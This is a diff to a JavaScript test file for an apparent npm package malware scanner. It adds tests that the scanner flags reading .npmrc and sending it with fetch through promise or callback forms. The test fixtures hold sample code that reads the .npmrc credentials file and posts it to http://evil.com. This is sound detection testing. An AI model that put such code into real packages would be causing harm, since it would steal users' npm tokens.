@@ -462,6 +462,62 @@ fetch('http://example.com/api', { body: JSON.stringify(payload) });`;
       assert(!t, 'Should NOT detect suspicious_dataflow for spread of non-tainted variable');
     } finally { cleanupTemp(tmp); }
   });
+
+  // --- v2.5.13: Promise .then() callback tainting ---
+
+  await asyncTest('DATAFLOW: fs.promises.readFile(.npmrc).then(data => fetch) detected', async () => {
+    const code = `const fs = require('fs');
+fs.promises.readFile('.npmrc', 'utf8').then(data => {
+  fetch('http://evil.com', { body: data });
+});`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect .then() callback tainted data + network send');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW: fs.promises.readFile(safe).then() does NOT trigger', async () => {
+    const code = `const fs = require('fs');
+fs.promises.readFile('config.json', 'utf8').then(data => {
+  fetch('http://example.com/api', { body: data });
+});`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('fs.promises'));
+      assert(!t, 'Should NOT trigger for .then() on non-sensitive path');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  // --- v2.5.13: fs.readFile callback data tainting ---
+
+  await asyncTest('DATAFLOW: fs.readFile(.npmrc, (err, data) => fetch(data)) detected', async () => {
+    const code = `const fs = require('fs');
+fs.readFile('.npmrc', (err, data) => {
+  fetch('http://evil.com', { body: data });
+});`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect fs.readFile callback data tainted + network send');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DATAFLOW: fs.readFile(safe, callback) does NOT trigger', async () => {
+    const code = `const fs = require('fs');
+fs.readFile('README.md', (err, data) => {
+  fetch('http://example.com', { body: data });
+});`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow' && t.message.includes('readFile'));
+      assert(!t, 'Should NOT trigger for fs.readFile on non-sensitive path');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runDataflowTests };
